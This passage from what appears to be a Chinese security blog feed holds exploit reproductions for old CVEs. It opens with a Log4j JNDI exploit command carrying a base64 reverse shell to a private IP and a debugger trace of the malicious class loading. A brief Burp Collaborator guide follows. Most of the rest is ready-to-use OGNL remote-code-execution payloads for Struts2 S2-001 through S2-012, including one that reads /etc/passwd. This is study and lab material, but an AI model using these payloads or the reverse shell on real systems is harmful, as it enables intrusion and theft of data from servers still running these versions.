&#123;echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguMjQ1LjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  &quot;192.168.245.1&quot;</span><br><span class="line">// -C后面接的是传递给Runtime.getRuntime().exec()的参数   比如-C &quot;calc&quot;,后面无其他参数</span><br></pre></td></tr></table></figure><p>那串base64是反弹shell命令  bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1  自行更改</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225084747373.png" alt="image-20230225084747373" style="zoom: 50%;" /><p>本地开启nc 监听 <code>nc -Lvvp 8888</code>   反弹shell我貌似成功不了</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225090400979.png" alt="image-20230225090400979" style="zoom:50%;" /><p>利用生成的rmi服务即可直接在客户端复现，无需自己搭建服务端</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225090332915.png" alt="image-20230225090332915" style="zoom:24%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230225090506946.png" alt="image-20230225090506946" style="zoom:34%;" /><h4 id="动态调试分析"><a href="#动态调试分析" class="headerlink" title="动态调试分析"></a>动态调试分析</h4><p>从客户端的lookup函数出发</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654317819302-53d881cb-b89a-4c76-839f-84e1fef84541.png" alt="img"></p><p>F7进入寻找其定义</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654317865691-ea8d0b1f-890d-42c1-9c29-10c38bc9bba9.png" alt="img" style="zoom: 88%;" /><p>再按F7找到函数定义</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654348360276-de33189e-cc70-4d8f-aee8-104bcb3565d2.png" alt="img" style="zoom: 78%;" /><p>这里的var2基本就是得到主机，端口，还有绑定的对象的名字</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654348345584-e11cba6a-6b82-43bf-862a-d9051513eac8.png" alt="img" style="zoom:75%;" /><p>跟进var3.lookup，可以看到lookup找到了注册中心的stub数据</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654348507281-cb7da13f-7e86-418e-9a41-bb2bc3195304.png" alt="img" style="zoom:72%;" /><p>跟进decodeObject函数，发现了加载了远程Reference绑定的恶意对象。我们的远程对象是ReferenceWrapper类的对象，也就是我们在Server构造的对象<code>Reference reference = new Reference(&quot;swswssw&quot;, &quot;swswssw&quot;, &quot;http://127.0.0.1:8080/&quot;);</code></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654319113334-da15f881-98d7-4fa0-9fcb-04c7e1e38e11.png" alt="img" style="zoom:77%;" /><p>跟进返回的getObjectInstance函数</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654344313817-41dda671-3926-44c3-897a-40dca4416f69.png" alt="img" style="zoom:75%;" /><p>持续步过，发现注册中心找到了恶意类swswssw，并赋值给ref</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654344495452-ceb88ab2-49c5-433a-9ab9-14438be50148.png" alt="img" style="zoom:89%;" /><p>ref不为空，进入关键函数getObjectFactoryFromReference</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654344636229-95cf505e-17cc-44c0-adc1-0dd6684cc7de.png" alt="img" style="zoom:74%;" /><p>先直接加载类<code>clas = helper.loadClass(factoryName);</code>，这里是正常的本地类加载，因为找不到swswssw类所以会加载失败</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654344746603-85eed53b-6b28-429a-ba69-7769959bc9a3.png" alt="img" style="zoom: 73%;" /><p>上面分析没有问题，找不到swswssw所以clas为空</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654345014188-0b7b74c1-b2bb-453b-b0dd-2284a3d5860f.png" alt="img" style="zoom:95%;" /><p>我们注意到codebase，其值就是远程URL</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654345097958-cf9662df-dd16-4d4e-a2be-3ebdb1f79f30.png" alt="img" style="zoom:79%;" /><p>跟进此时的类加载器，因为指定了codebase，这次用的类加载器将是URLClassLoader</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654345254399-3772417a-10f8-4fc2-8aec-dc79de8c8621.png" alt="img" style="zoom:82%;" /><p>返回值最后会在此处加载，调用Class.forName并制定了类加载来加载类，这样可以加载到swswssw。Class.forName加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654346398528-42a7ab66-a640-430a-9d2f-0c17d8ef55ed.png" alt="img" style="zoom:83%;" /><p>这样函数返回值赋予clas，其为swswssw；返回函数调用它的<code>newInstance()</code>，从而调用了无参构造器，执行了无参构造器里面的代码，这也是为什么我们把恶意代码写到无参构造器里面的原因。</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654346487494-6d9f741d-516f-48c6-a306-5ab3162e494c.png" alt="img" style="zoom:75%;" /><p>这样，如果得到了对象且成功转换成了ObjectFactory，就会调用getObjectInstance方法，这也是为什么可以把代码写到getObjectInstance方法的原因。</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654347486441-c8381e40-8ec8-4219-8ee9-92abae6fb15d.png" alt="img" style="zoom:91%;" /><p>此时开始执行恶意类中的恶意代码，首先打印</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654347538453-a7507356-cf1e-4f2b-aca2-55cc3e1486de.png" alt="img"></p><p>然后执行命令</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1654347576574-d3cc58e9-3a80-41aa-8cb2-3b308f348e7c.png" alt="img" style="zoom:93%;" /><p>参考文章：<a href="https://www.yuque.com/xiangxiangzhizhong-fmgoa/yaqwh4/eagm36#Q6WGw"><strong>CVE-2021-44228 Apache Log4j 远程代码执行漏洞 复现与分析</strong></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h4&gt;&lt;p&gt;Log4j的lookup功能——本次漏洞是因为Log4j2组件中 lookup功能的实现类 &lt;code&gt;JndiLookup&lt;/code&gt; </summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="log4j" scheme="https://micgo.top/tags/log4j/"/>
    
  </entry>
  
  <entry>
    <title>burp插件</title>
    <link href="https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/burp%E6%8F%92%E4%BB%B6/"/>
    <id>https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/burp%E6%8F%92%E4%BB%B6/</id>
    <published>2023-02-25T16:00:00.000Z</published>
    <updated>2023-02-26T07:36:20.054Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Collaborator"><a href="#Collaborator" class="headerlink" title="Collaborator"></a>Collaborator</h4><p>我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在漏洞</p><p>这个时候我们需要一个外部的独立的服务器，可以通过域名 url 进行访问。然后在测试漏洞是否存在的时候带上这个服务器的地址，如果存在上述的这些问题，那么目标服务器就会去访问我们自己的服务器，我们自己服务器可以记录别人访问自己的信息，记录其发送内容相应内容等，从而有利于我们判断漏洞是否存在</p><p>明白原理后，Burp 给我们提供了这个外部服务器，叫 Collaborator</p><p>当使用 burp 的 collaborator 时，burp 会提供一个 url 地址，这个地址是 burp 的一个二级域名</p><p>轮询：burp 发送 payload 后会不断的问 collaborator 是否收到我发生的 payload 交互信息，例如 10s 问一次</p><p>在插件商店搜Collaborator，发现无法下载，得先配个jython环境</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226152444869.png" alt="image-20230226152444869" style="zoom:50%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226152428199.png" alt="image-20230226152428199" style="zoom:50%;" /><p>配好后可以测试一下</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226152908744.png" alt="image-20230226152908744" style="zoom:40%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226152828499.png" alt="image-20230226152828499" style="zoom:50%;" /><p>可能是要代理</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226152951726.png" alt="image-20230226152951726" style="zoom:40%;" /><p>再次测试成功</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226153109963.png" alt="image-20230226153109963" style="zoom:45%;" /><p>简单的dnslog功能，Number to generate 是生成的数量，下面的 poll now 按钮是轮询时间，点击 copy to clipboard 复制其提供的 payload url 后，就可以直接在要测试的点粘贴即可，如果目标服务器有交互，则 collaborator 会有响应信息，且这个 payload url 每次复制其二级域名都会随机生成</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230226150135849.png" alt="image-20230226150135849" style="zoom:45%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Collaborator&quot;&gt;&lt;a href=&quot;#Collaborator&quot; class=&quot;headerlink&quot; title=&quot;Collaborator&quot;&gt;&lt;/a&gt;Collaborator&lt;/h4&gt;&lt;p&gt;我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些</summary>
      
    
    
    
    <category term="工具使用" scheme="https://micgo.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="burp" scheme="https://micgo.top/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>struts2系列漏洞复现</title>
    <link href="https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-02-21T16:00:00.000Z</published>
    <updated>2023-02-25T13:50:35.117Z</updated>
    
    <content type="html"><![CDATA[<h4 id="S2-001-CVE-2007-4556"><a href="#S2-001-CVE-2007-4556" class="headerlink" title="S2-001(CVE-2007-4556)"></a>S2-001(CVE-2007-4556)</h4><p>该漏洞因为用户提交表单数据并且验证失败时，<strong>后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中</strong>。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用         %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><p>先来测试一下是否真的存在远程代码执行</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105112421.png" alt="image-20230223105112421" style="zoom: 39%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105140128.png" alt="image-20230223105140128" style="zoom:39%;" /><p>发现都把password中括号里的值返回来了</p><p>这样构造如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105234298.png" alt="image-20230223105234298" style="zoom:50%;" /><p>语句被执行，查看返回的语句是&#x2F;user&#x2F;local&#x2F;tomcat即使tomcat的执行语句；</p><p>然后获取web路径，构造如下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line">#response.flush(),</span><br><span class="line">#response.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105303991.png" alt="image-20230223105303991" style="zoom:50%;" /><p>可见返回了web路径,为&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT</p><p>查看当前权限，返回的是root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行任意命令时只需要，将whoami的命令替换，例如如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105339077.png" alt="image-20230223105339077" style="zoom:50%;" /><p>至此漏洞复现完成</p><p><strong>修复方式</strong>：<br>改变 OGNL表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行</p><h4 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h4><p>s2-005漏洞的起源源于s2-003（受影响版本：低于Struts2.0.12）, struts2会将http的每个参数名解析为OGNL语句执行（可理解为Java代码）</p><p>OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码（\u0023)或8进制（\43）即绕过了安全限制。对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这两个选项打开，S2-003的修补方式把自己上了一个锁，但是把钥匙插在了锁头上</p><p><strong>影响版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts 2.0.0-2.1.8.1</span><br></pre></td></tr></table></figure><p><strong>绕过过程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 在S2-003中\u0023用于绕过struts2的过滤器#</span><br><span class="line">2. 在S2-003 struts2添加安全模式（沙盒）之后</span><br><span class="line">3. 在S2-005中，使用OGNL表达式关闭安全模式并再次绕过</span><br></pre></td></tr></table></figure><p><strong>漏洞利用exp</strong></p><p>直接GET方法访问，执行任意命令POC（无回显，空格用@代替）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><h4 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h4><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p><p>例如这里有一个 <code>UserAction</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure><p>然后配置有 <code>UserAction-validation.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <strong><code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code></strong> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQL注入单引号拼接的方式即可注入任意 OGNL 表达式</p><p><strong>影响范围</strong></p><ul><li>2.0.0 - 2.2.3</li></ul><p><strong>漏洞利用exp</strong></p><p>给出执行任意代码的EXP：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#foo=<span class="keyword">new</span> java.lang.<span class="type">Boolean</span>(<span class="string">&quot;false&quot;</span>) ,#context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=#foo,<span class="meta">@org</span>.apache.commons.io.<span class="type">IOUtils</span><span class="meta">@toString</span>(<span class="meta">@java</span>.lang.<span class="type">Runtime</span><span class="meta">@getRuntime</span>().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>将Exp传入可以利用的输入框，得到命令执行结果：</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223112530925.png" alt="image-20230223112530925" style="zoom: 50%;" /><h4 id="S2-008-CVE-2012-0391"><a href="#S2-008-CVE-2012-0391" class="headerlink" title="S2-008(CVE-2012-0391)"></a>S2-008(CVE-2012-0391)</h4><p><code>devMode</code>下支持直接执行OGNL表达式，Cookie 拦截器错误配置可造成 OGNL 表达式执行，生产环境一般不会存在该漏洞，但是开了debug模式就可以直接执行命令<br>由于debug模式本身就不该开放在生产模式，因此由debug模式引发的漏洞并没有对应的修复方案.</p><p><strong>影响范围</strong></p><ul><li>Struts 2.1.0 - Struts 2.3.1</li></ul><p><strong>漏洞利用exp</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/devmode.action?debug=command&amp;expression=(%23_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]%<span class="number">3</span>dtrue%<span class="number">2</span>c%23foo%3dnew+java.lang.Boolean(<span class="string">&quot;false&quot;</span>)+%<span class="number">2</span>c%23context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]%<span class="number">3</span>d%23foo%<span class="number">2</span>c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(<span class="string">&#x27;ls+-al+./&#x27;</span>).getInputStream()))</span><br></pre></td></tr></table></figure><p><a href="https://img2023.cnblogs.com/blog/3076168/202301/3076168-20230108204630588-1489659374.png"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223112840676.png" alt="image-20230223112840676"></a></p><h4 id="S2-009-CVE-2011-3923"><a href="#S2-009-CVE-2011-3923" class="headerlink" title="S2-009(CVE-2011-3923)"></a>S2-009(CVE-2011-3923)</h4><p>这个漏洞跟s2-003 s2-005 属于一套的, Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；Struts2对s2-005的修复方法是禁止 \ 等特殊符号，使用户不能提交反斜线。 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/HelloWorld.acton?example=&amp;(example)(&#x27;xxx&#x27;)=1 </span><br></pre></td></tr></table></figure><p> 的方法来执行它，从而绕过官方对 #、\ 等特殊字符的防护。</p><p><strong>影响范围</strong></p><ul><li>2.1.0 - 2.3.1.1</li></ul><p><strong>漏洞利用exp</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[<span class="number">51020</span>],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223113846295.png" alt="image-20230223113846295"></p><h4 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h4><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里 <code>UserAction</code> 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p><strong>影响范围</strong></p><ul><li>2.1.0 - 2.3.13</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%23a%3D(new java.lang.ProcessBuilder(new java.lang.String%5B%5D%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C %22ls%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew java.io.InputStreamReader(%23b)%2C%23d%3Dnew java.io.BufferedReader(%23c)%2C%23e%3Dnew char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223115016179.png" alt="image-20230223115016179"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;S2-001-CVE-2007-4556&quot;&gt;&lt;a href=&quot;#S2-001-CVE-2007-4556&quot; class=&quot;headerlink&quot; title=&quot;S2-001(CVE-2007-4556)&quot;&gt;&lt;/a&gt;S2-001(CVE-2007-4556)&lt;/h4</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="java security" scheme="https://micgo.top/tags/java-security/"/>
    
  </entry>
  
  <entry>
    <title>java基础</title>
    <link href="https://micgo.top/java-security/java%E5%9F%BA%E7%A1%80/"/>
    <id>https://micgo.top/java-security/java%E5%9F%BA%E7%A1%80/</id>
    <published>2023-02-19T16:00:00.000Z</published>
    <updated>2023-03-09T06:46:37.715Z</updated>
    
